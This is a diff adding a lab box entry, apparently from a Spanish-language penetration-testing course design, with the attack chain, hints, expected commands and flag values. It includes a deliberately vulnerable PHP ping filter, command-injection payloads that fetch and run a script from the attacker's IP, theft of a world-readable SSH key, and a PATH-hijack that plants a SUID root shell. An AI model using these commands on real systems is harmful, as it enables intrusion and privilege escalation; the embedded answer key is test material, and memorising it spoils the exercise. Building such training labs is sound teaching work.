@@ -876,6 +876,83 @@ noise:
 
 ---
 
+## Box 12 — `Marwick`
+
+```
+id: 12
+name: Marwick
+os: linux
+difficulty: medium
+est_time: 60-90 min
+tags: [web, command-injection, filter-bypass, exposed-ssh-key, suid, path-hijacking]
+
+target_ip: 10.10.14.73
+tun0_ip: 10.11.0.7
+
+services:
+  22: OpenSSH 8.2p1
+  80: Apache 2.4.41 + PHP 7.4 — "Marwick IT — Internal Tools"
+
+surface:
+  - Web = panel interno con "Network Ping Test" (campo host -> ping). diag.php: `if(preg_match('/[;|]/',$h)) die(...); echo shell_exec("ping -c1 ".$h);`
+  - Filtro bloquea `;` y `|`, pero `&` y `$()` pasan.
+  - config.php = SEÑUELO (solo un token de widget, no cred de sistema).
+
+chain:
+  - step: foothold-cmdi
+    trigger: campo host se concatena a ping sin sanitizar bien
+    technique: OS command injection con bypass de filtro
+    cheat_ref: [[02-web]] (command injection) · [[03-sqli-bbdd]]
+    aha: filtro de `;|` -> usa `&` o `$()`; el staged `curl|bash` FALLA por el `|` -> usa `&&` o `bash -c "$(curl -s ...)"`
+    expected_action: "host=8.8.8.8 & id -> www-data; luego & curl TU_IP/s.sh -o /tmp/s && bash /tmp/s"
+    hints:
+      - "la salida cruda del ping + concatenación = command injection. Prueba un separador."
+      - "filtra ; y | -> quedan & y $(). El |bash de tu staged también lleva | (bloqueado)."
+      - "evita el pipe: `&& bash /tmp/s.sh`  o  `bash -c \"$(curl -s http://IP/s.sh)\"`"
+    resultado: RCE www-data -> reverse
+  - step: lateral-exposed-key
+    trigger: config es señuelo -> ampliar enumeración
+    technique: clave SSH privada world-readable (644)
+    cheat_ref: [[07-privesc-linux]] · [[12-post-explotacion]]
+    aha: no todo es cred-reuse; `find /home -type f -readable` / `ls -la /home/*/.ssh/` -> id_rsa de jolan en 644
+    expected_action: "find /home -readable / ls -la /home/*/.ssh -> copiar id_rsa -> chmod 600 -> ssh -i"
+    hints:
+      - "config señuelo -> amplía: otros users, world-readable, claves SSH. `find /home -type f -readable`."
+      - "una id_rsa en 644 es legible por todos -> cópiala."
+      - "ssh rechaza key con permisos abiertos -> `chmod 600 id_rsa` antes."
+    resultado: SSH como jolan -> user flag
+  - step: privesc-path-hijack
+    trigger: SUID custom /usr/local/bin/mw-sysinfo
+    technique: PATH hijacking (system con comando relativo)
+    cheat_ref: [[07-privesc-linux]] (PATH hijacking)
+    aha: `strings` -> `setuid` + `system("uptime")` RELATIVO -> pon tu uptime delante en PATH
+    expected_action: |
+      printf '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash\n' > /tmp/uptime
+      chmod +x /tmp/uptime ; export PATH=/tmp:$PATH
+      /usr/local/bin/mw-sysinfo ; /tmp/rootbash -p
+    hints:
+      - "SUID custom -> strings. ¿llama a un comando por nombre RELATIVO (sin /ruta)?"
+      - "system('uptime') busca uptime en TU PATH -> ponlo delante."
+      - "export PATH=/tmp:$PATH (tu dir PRIMERO); el SUID ejecuta tu uptime como root -> planta SUID bash."
+    resultado: SUID rootbash -> /tmp/rootbash -p -> root
+
+creds:
+  - (id_rsa de jolan, world-readable 644)   -> SSH jolan
+
+flags:
+  user: 2c7f1a0d9e63b84501f2a7c6d3b80e14
+  root: 9d3e5b2170c4a6f8e01b9d7c4a2f6305
+
+noise:
+  - config.php (token widget) = señuelo; dave/otros sin cred reutilizada.
+  - SUID/caps de sistema = baseline.
+  - error del alumno: `curl|bash` con pipe bloqueado por el filtro; y olvidar `chmod 600` a la key.
+```
+
+**Lección pedagógica:** command injection con **bypass de filtro** (`;|` fuera → `&`/`$()`; el `curl|bash` lleva pipe → `&&`/`$()`); **no todo es cred-reuse** (config señuelo → `find -readable`, clave SSH 644); y **PATH hijacking**: SUID que hace `system()` con comando **relativo** → `export PATH=/tudir:$PATH` → el SUID ejecuta tu binario como root (planta SUID bash, lo abres tú). Primo del `.so` hijacking pero con un ejecutable en el PATH, no una librería.
+
+---
+
 ## 📈 Ideas de evolución (roadmap del proyecto)
 
 - Añadir cajas Windows (SeImpersonate → PrintSpoofer/GodPotato) y AD (roasting → DCSync) con el mismo esquema.
